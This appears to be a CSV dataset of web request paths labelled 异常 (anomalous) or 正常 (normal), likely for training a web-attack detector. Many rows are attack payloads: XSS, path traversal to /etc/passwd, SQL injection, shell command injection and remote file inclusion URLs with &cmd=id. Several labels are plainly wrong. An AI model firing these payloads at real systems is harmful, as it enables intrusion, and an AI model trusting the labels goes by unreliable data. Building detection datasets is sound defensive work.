label,content
异常,"/?2=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E"
异常,/46/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&field=%29%3C/script%3E%3Cscript%3Ealert%2842873%29%3C/script%3E//
正常,/abf_js.php?abs_pfad=http://192.168.202.118:8080/ghl9il??&cmd=id
正常,/sources/misc/new_day.php?path=http://192.168.202.118:8080/ghl9il?
正常,/top.php?stuff=|ping\x09-w\x097000\x09-n\x091\x094.3.2.1|rem\x09
正常,/114727997757637767/
正常,/pollbot/
异常,/en-us/7o5qp766.jspa?<script>cross_site_scripting.nasl</script>
正常,/weighing_scales/
正常,/nfsgynw65/
异常,/aj3pf49c.nsf?<meta http-equiv=set-cookie content="testnofv=4170">
正常,"/help.php?q=ping,-w,11000,-n,1,4.3.2.1&rem,"
异常,;system('id')
异常,"""&&echo$IFSMNOJXK$((12%2B14))$(echo$IFSMNOJXK)MNOJXK%7C"
异常,/w4996nr0.html?<meta http-equiv=set-cookie content="testttvs=7163">
异常,/cgi-bin/search/results.stm?indexname=>"><script>foo</script>&style=fancy&spage=60&query=folder name
正常,/kevin mitnick the art of deception includes chapter 1 banned ed/
正常,/000049360/
正常,/31717_thumb/
正常,/javascript/egress.java
正常,/sage 100 gestionnaire applications v13/
正常,/wizardbutton/
异常,/vac1l5vm.fts?<script>cross_site_scripting.nasl</script>
异常,/33y9gcqq.php3?<meta http-equiv=set-cookie content="testnvxc=4301">
异常,/<script>document.cookie="testftxz=5980;"</script>
异常,/7u1pb2xi.kspx?<meta http-equiv=set-cookie content="testlwwz=718">
异常,/uvazfs7p.pl?<script>document.cookie="testwtbo=4831;"</script>
异常,/examples/jsp/sessions/dcforum.cgi?az=list&forum=../../../../../../../etc/passwd\x00
正常,/150688/
正常,/reel reviews - films worth watching/
异常,/<4429ea00/
异常,/phplib/version/1.3.3/module/referenz.php?tt_docroot=XXpathXX
异常,/datei.php?config[root_ordner]=XXpathXX?&cmd=id
异常,<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
正常,/roadside_surviv/
正常,/ameri-sponsor/
正常,/dead can dance - into the labyrinth/
异常,/include/include_stream.inc.php?include_path=XXpathXX
异常,/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/{FILE}
异常,/rpxyx07v.mscgi?<meta http-equiv=set-cookie content="testbnli=1975">
异常,/en-us/i686v90l.php?<script>document.cookie="testfutf=1550;"</script>
正常,/25sep06-nusra200/
正常,/implementing information security calder-773906/
正常,/books/home.php?home=http://192.168.202.96:8080/txenjrxf3?
异常,/oie504mr.jsp?<meta http-equiv=set-cookie content="testtpby=7052">
异常,/main.php?stuff=\x0auname >q18828288 #
正常,/w32rbotama/
正常,/doctor who 27x04 aliens of london 80/
正常,/fipr release for lords ctee 3rd day 28/
正常,/library/classes/class.handler_hl7v2.php
异常,/help.php?q="\x0duname #
异常,/children's_museums/
正常,/msg213917/
异常,/classes/Auth/OpenID/Message.php?_ENV[asicms][path]=XXpathXX
正常,/artist-41126/
正常,/admin/comment.php?config[installdir]=@rfiurl
正常,/desktop_pics/
异常,/javascript/pfx.exe
正常,/index1339/
正常,/nine inch nails-broken(darkside_rg)/
正常,/zina teen in threesome - part 2 and 4/
正常,/fid708f18daf279c4e69ddaa88d2a1c307b6976ef7e/
异常,/examples/jsp/jsp2/el/index.php?show=../../../../../../../../../../../etc/passwd\x00
正常,/topxstats/
正常,/feature-02/
正常,/xbeyidnfpr8btla4m981f8k33sxmspafarcncf1tu5upvur6ba-03298/
正常,/skins/phpchess/layout_t_top.php?root_path=http://cirt.net/rfiinc.txt?
异常,/descriptions/
异常,"""%26echo$IFSJNESPQ$((88%2B93))$(echo$IFSJNESPQ)JNESPQ%27"
异常,/bl8sefdm.aspx?<img src="javascript:alert(cross_site_scripting.nasl);">
异常,%2527%3B%20str%3D%24%28echo%20QUKUCG%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%22
正常,/000023538/
正常,/191206_foreclose/
正常,"/cgi-bin/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331905170"
正常,/99tr028exsum/
异常,%3B%20str%3D%24%28echo%20EWYGBO%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20//
正常,/institutionalholders/
正常,/es_offer.php?files_dir=http://cirt.net/rfiinc.txt?
异常,/examples/jsp/sessions/core/adodb/server.php?sql='adodb_sql_sql_injection.nasl
正常,/en-us/account/index.php?req_path=http://xxxxxx./
异常,/recordings/file.php?path=/etc/passwd\x00
异常,/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
异常,%3B%20str%3D%24%28echo%20HNLFQM%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2526
正常,/video option vol 111 - 2003 d1 grand prix round 3/
正常,/shop/index.php?action=@rfiurl?action=@rfiurl?&cmd=cat config.php
异常,innerHTML=innerText
正常,/110479/
正常,/002504/
正常,/river_of/
正常,/ovcgi/ifacemgr/setnotmon.ovpl?action=continue&hostname=hp_openview_nnm_multiple_cmd_exec.nasl-1331918977|id
正常,/thanksgiving01/
异常,/46/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&api_key=%22%3E%3C/script%3E%3Cscript%3Ealert%28/42873/%29;%3C/script%3E
正常,/m_900727087/
异常,/linux-scripts/
正常,/privilege/
正常,/stc-the/
异常,/top.php?stuff=uname >q79861172 #
异常,%26%20sleep%200%20%26%26%20str%3D%24%28echo%20KIGXDW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2526
正常,/187352/
异常,&quot;;id&quot;
异常,../../../../../../../../../../../../localstart.asp%00
异常,%2527%3B%20str%3D%24%28echo%20BVJEPJ%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%23
正常,/20041011-2/
正常,/azureus bittorrent client_information/
异常,/scripts/editor/filemanager/connectors/php/upload.php?command=fileupload&type=file&currentfolder=/fckeditor_currentfolder_file_upload-1332008336.php.
正常,/topleft24/
正常,/aikido-steven seagal the path beyond thoug/
异常,OR 1=0
异常,/odzk29aa.exe?<meta http-equiv=set-cookie content="testtfvh=2141">
正常,/4160594/
正常,/rainbow six rogue spear_information/
异常,<svg><doh onload=confirm(1)>
异常,/17335/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%22%20onmouseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
正常,/1107mccowen-george/
正常,/engelsk/
正常,/javascript/1990.sh
异常,/opensiteadmin/scripts/classes/filters/singlefilter.php?path=http://192.168.202.96:8080/swgnhpydbq0t?\x00
正常,/1121538901095/
正常,/admin/inc/add.php?format_menue=http://192.168.202.118:8080/ghl9il?
正常,/michael jackson - the way you make me feel [synter]/
异常,/help.php?q='&rm\x09q61993923\x09#
正常,/mzm3mti1/
正常,/b8c341/
正常,/p2p.nsf
异常,/main.php?stuff="&sleep\x0911\x09#
正常,/kokona - rammstein/
正常,/ran20030626020579/
正常,/sprintplan/
正常,/gothic teen self harms while masterbating/
异常,/examples/jsp/error/data/fetch.php?page='
正常,/main.php?logout=&ping -w 11000 -n 1 1.2.3.4&rem 
正常,/184737/
正常,/classes/customer.class.php?rootdir=http://192.168.202.118:8080/ghl9il??
异常,/ida_scripts/
正常,/ver2004/
正常,/045842/
正常,/realvideoserver/
正常,/rss-2604/
异常,%3B%20str%3D%24%28echo%20KUMDME%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C
正常,/ripoff167471/
正常,/nexus - the jupiter incident_information/
异常,/cfscripts/
异常,/plugins/BackUp/Archive.php?bkpwp_plugin_path=XXpathXX?
正常,/hnwifi_1/
异常,/phpwebfilemgr/index.php?f=../../../../../../../../../etc
异常,/..../..../..../..../..../..../..../..../..../..../..../..../etc/passwd
异常,/60/mobile/goods_list.php?type=1s'%20onmouseover=alert(/ed1e83f8d8d90aa943e4add2ce6a4cbf/)%20//
异常,&echo%20UDYYJG$((66%2B1))$(echo%20UDYYJG)UDYYJG'
正常,/dvd and audio ripping software various programmes very good/
异常,/javascript/error-log.exe
正常,/040405-spyware/
异常,/cgi-915/vssetcookie.exe
正常,/castellon_63/
正常,/calamitygraphics/
正常,/visualroute-i15524/
正常,/wrx-smbdx/
正常,/255843/
异常,&#060;
异常,/top.php?stuff='uname >q76482731 #
正常,/freeware_traceroute/
异常,/ju0u7kfo.nsf?<img src="javascript:alert(cross_site_scripting.nasl);">
异常,/mostlyce/jscripts/tiny_mce/plugins/htmltemplate/htmltemplate.php?mosconfig_absolute_path=@rfiurl
正常,/t345tdr014/
正常,/rock_1990s/
正常,/43336858/
正常,/s-sterling/
异常,"/index.php?controller=block&action=goodsCommend&id=0)%20Union%20select%201,md5(1122)%23"
正常,/159215/
正常,/event_view.php?eid=34 union select 2017746212
正常,/amazon/cart.php?cmd=add&asin=http://192.168.202.96:8080/vir0v3xfc?
正常,/michael_bond/
正常,/datapass_v1/
正常,/big tits round asses 050 - blossom/
正常,/suspectantispyware/
正常,/examples/jsp/jsp2/jspx/config/oramon.ini
异常,"/examples/jsp/num/faq.php?action=&type=view&s=&id=-1' union select 0,230233793,0,0,0,0,0--"
正常,/wp-content/plugins/jw-player-plugin-for-wordpress/
正常,/b2verifauth.php?index=http://192.168.202.96:8080/vir0v3xfc??
正常,/malicious_software/
正常,/photoshopbox/
异常,/3j8echh0.aspx?<meta http-equiv=set-cookie content="testfuqi=4189">
正常,/linux_yinyang/
正常,/javascript/jboss.ws
异常,/let's-dance/
异常,/ao22ww7y.aspx?<script>document.cookie="testqppc=8767;"</script>
异常,%3B%20str%3D%24%28echo%20OLJBSU%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527
正常,/371826-001/
异常,%26echo%20VLCTNG$((82%2B89))$(echo%20VLCTNG)VLCTNG|
异常,<script>alert(document.head.childNodes[3].text)</script>
正常,/calcul-page.php?home=http://192.168.202.96:8080/whmch8ftkt7kv?
异常,/cgi-bin/index.php?act=arcade&do=stats&gameid=1'
异常,<body src=1 href=1 onerror="javascript:alert(1)"></body>
正常,/000029155/
正常,/diesel-dz2062_thb/
异常,/myhome/do.php?ac=71ee30ae117cddace55bd01714904227%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL--%20&ref
正常,/eduhome_it/
正常,/rest-beauty_saloons/
异常,/g3w7y7u5.php3?<meta http-equiv=set-cookie content="testbfpq=3326">
异常,%27%0A%20str%3D%24%28echo%20LMRVVK%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27
正常,/javascript/surf.asp
正常,/hp-9000_w0qqfsooz1qqfsopz3qqsbrsrtzl/
正常,/cgi/cfdocs/expeval/exprcalc.cfm?openfilepath=c:\winnt\win.ini
正常,/blackcollarlessshirtuk/
异常,/javascript/diffs.exe
正常,/rubrique3/
正常,/fidac73835cac8f4fb33502fad1f37cdd61ba7ab57f/
异常,%2527%3B%20str%3D%24%28echo%20BVJEPJ%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%23
正常,/drumbass/
正常,/javascript/schedule.core
异常,/ju0u7kfo.cfc?<script>cross_site_scripting.nasl</script>
异常,/en-us/ddoworrl.jsp?<meta http-equiv=set-cookie content="testvlau=8517">
正常,/lib/classes/swift/events/eventdispatcher.php.1
正常,/disc-golf/
正常,/54895378/
正常,/go_2egif/
异常,/igtf0zon.aspx?<script>cross_site_scripting.nasl</script>
异常,%3B%20str%3D%24%28echo%20JBUKTB%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%22
异常,/rpxyx07v.jsp?<meta http-equiv=set-cookie content="testbnli=1975">
异常,jaVasCript:/-/%60/%5C%60/'/%22//(/%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E%3E
异常,%0A%20str%3D%24%28echo%20JLLXMB%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527
正常,/1469051177/
正常,/newsid_292000/
正常,/supercompressedglobalcopy2ofcompavatardi9/
异常,/administrator/components/com_jreactions/langset.php?comPath=XXpathXX?
异常,/myhome/do.php?ac=71ee30ae117cddace55bd01714904227%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL--%20&ref
异常,/top.php?stuff="ver\x09>q19467518&rem\x09
异常,/examples/jsp/jsp2/jspx/bb_func_txt.php?pathtofiles=/etc/passwd\x00
异常,/register.php?do=submit%22%29%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%23
正常,/caliphate_voice-channel/
正常,/chaosmash/
异常,/_vti_bin/_vti_aut/author.exe
正常,/javascript/subscriptions.pem
异常,/help.php?q='\x0ddel\x09q79317735\x09#
异常,/9kr0ih0v.exe?<script>document.cookie="testzgnm=1183;"</script>
异常,/gvx7m5ti.asp?<script>document.cookie="testwldz=3506;"</script>
异常,%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20UXESAW%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527
正常,/quickie.php?quick_path=@rfiurl?quick_path=@rfiurl?&cmd=id
正常,/phfito/phfito-post?src_path=http://192.168.202.118:8080/2aibfaczmac8?
异常,/javascript/graphics.exe
异常,;echo$IFSVQMZED$((6%2B60))$(echo$IFSVQMZED)VQMZED%7C
正常,/20040301-7/
正常,/functions.php?include_path=http://192.168.202.118:8080/tzhfyzkbomspvm?
异常,"/myhome/shop.php/picture.php?cat=0&image_id=-999%20and%20if(1=0,benchmark(5000000,md5(7)),1)"
正常,/p56-0x0d/
正常,/a3jmf1pkn2s99h/
正常,/iod letter 8/
正常,/1814245/
正常,/annonce.php?page=http://192.168.202.118:8080/ghl9il??&cmd=id
正常,/javascript/session.php
正常,/realvxer/
正常,/steg2f/
正常,/503 uncut/
正常,/lib/exe/indexer.php?id=dns&1331895368
正常,/20040625-6/
正常,/skinker/
正常,/gen_assembly/
异常,"1%27%20union%20select%201,2,3--"
正常,/a2gsglz7anh8z4/
异常,/myhome/space.php?id=1436049205%27%29%20UNION%20ALL%20SELECT%20NULL--%20
正常,/sb20060926_613964/
正常,/bottomline/
正常,/ballet_lg/
正常,/war games inc/
异常,/x'squeezeme!_v3/
正常,/javascript/sources.cfm
异常,"<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){confirm(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>"
正常,/msnmessengersetupdownloader/
正常,/130450/
正常,/prima-1/
正常,/50163_wallpaper110/
异常,/index.php?c=access&a=login&ref_c=nessus"><script>alert(608742635)</script>&ref_a=projectpier_login_page_xss.nasl"><script>alert(1145091042)</script>
正常,/keystonecybercops/
正常,/breakaway_w0qqprz43095080qqtgzinfo/
异常,<body onresize=alert(1)>press F12!
异常,/h4bi26jd.do?<meta http-equiv=set-cookie content="testhrzx=1150">
正常,/index1706/
正常,/forensics_updates/
正常,/organic_rain/
异常,/d44uk9h2.jsp?<meta http-equiv=set-cookie content="testmybc=2088">
正常,/mishak/
正常,/s7_links1/
正常,/fannie_may/
正常,/index897/
正常,/euenlarge2007slovenia_070101223722/
正常,/pencil_show/
正常,/windowsxp product key viewer see your cd key/
异常,/help.php?q="&rm q44114596 #
正常,/clevelandsummerjobs/
异常,;echo$IFSBUCQOY$((75%2B89))$(echo$IFSBUCQOY)BUCQOY%22
异常,jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(3))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(4)//>\x3e
正常,/09adco/
异常,/scripts/member/index.php
异常,"/cacti/index.php?page=documents&doc=-99' union select null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null--"
正常,/top_green/
异常,/templates/sidebar/template.tpl.php?renderer=XXpathXX
正常,/cd2_dollhouse/
正常,/003564/
正常,/examples/jsp/jsp2/el/tiki-index.php
异常,/scriptpath/index.php?page=http://192.168.202.96:8080/ipb5ri?
正常,/home_knowledge/
正常,/javascript/cms.pem
正常,/bb king - his definitive greatest hits/
正常,/fidfcb79829ec4628e2917ded73a3663ac0410618c7/
异常,&#x3E;
异常,${proc_open(print(`echo%20HWBQFG;echo%20$((79%2B43));echo%20HWBQFG;echo%20HWBQFG`)%3B.%2527HWBQFG
正常,/369200/
正常,/df05dec7f743ab807bfd4a47135aa61f-22/
正常,/fid9bf1f212310e6c6abc92d4de5715685d4a143f62/
正常,/en-us/static/@95063:81/app/launcher/applogo.png
正常,/3700100/
异常,/j4oqyvga.fts?<script>cross_site_scripting.nasl</script>
正常,/postt22393/
异常,/manager/port.php?proto=tcp'
正常,/report-technologies/
正常,/examples/jsp/sessions/index.cfm?catid=1 sql
异常,/help.php?q=";del q25549328 #
正常,/citadel_174x50/
正常,/javascript/procurement.tar.bz2
正常,/javascript/q.trace
正常,/ms00-058/
异常,/scripts/wd7crx47eaml.html
正常,/admin/classes/pear/ole/pps/file.php?homedir=@rfiurl
正常,/hotkeycontrol_information/
正常,/redhead/
异常,%2522%3B%20str%3D%24%28echo%20LMZYDH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C
正常,/abt_con/
正常,/mutualfunds/
异常,%22%7Cecho$IFSUSGSMP$((39%2B12))$(echo$IFSUSGSMP)USGSMP%27
正常,/152510/
异常,ORDER BY 19  
正常,/elseif/contenus.php?contenus=http://192.168.202.118:8080/iroy1gvqrrqu?
异常,%7Cecho%20VUMPEC$((81%2B13))$(echo%20VUMPEC)VUMPEC%2F%2F
正常,/bittorrent acceleration patch_information/
正常,/lib/connect.php?root=http://192.168.202.118:8080/zz5thkvtmlgl?
正常,/aircraftchartercompanies/
正常,/1164812879/
正常,/img_nav/
正常,/awards_a/
异常,/wps/wcm/webinterface/login/login.jsp?"><script>alert("ibm_login_qs_xss.nasl-1331909400")</script>
正常,/\xd0\x93\xd0\xb0\xd0\xb7\xd0\xb5\xd1\x82\xd1\x8b/
正常,/americanyachtinstitute/
异常,/../../../../../../../../%2A
异常,/examples/jsp/error/styles.php?toroot=/etc/passwd\x00
正常,/nav_gallery/
正常,/general/sendpassword.php?action=send
异常,/belegungsplan/tagesuebersicht.inc.php?root=XXpathXX
正常,/extra_instructions/
正常,/the-earth/
正常,/power mp3 cutter joiner_information/
异常,%26%20sleep%200%20%26%26%20str%3D%24%28echo%20GZNGDE%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%26
异常,%3B%20str%3D%24%28echo%20GZPDPD%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20
正常,/my_password/
正常,/anshed/
正常,/483608/
正常,/202610/
正常,/natale a miami 2005 italian md cam xvid-ska/
异常,/examples/jsp/checkbox/?mod=read&id=../../../../../../../../../../../../../etc/passwd\x00
正常,/0596100221_cat/
正常,/lib/classes/swift/encoder.php
正常,/20031209-8/
正常,/fidf339626855615dfab0db91d0d3abbec4f8e2dcf9/
异常,/scripts/counter.exe
异常,/scripts/starnet/addons/slideshow_full.php?album_name='648730541
正常,/post-14204/
正常,/20031122-5/
异常,%2527%0A%20str%3D%24%28echo%20JKJFEG%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527
正常,/289696/
正常,/corner_red/
正常,/zaragoza_8/
正常,/vita78/
正常,/examples/jsp/sessions/account/?action=login
正常,/imixhowto/
异常,<script src="data:&comma;alert(1)//
异常,/examples/jsp/jsp2/jspx/kb.cgi?view='&lang=en
异常,%26%20sleep%200%20%26%26%20str%3D%24%28echo%20SZMRAM%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%5C%5C
正常,/op7gl00bywjhgv/
正常,/absolute dance 2003 - move your body/
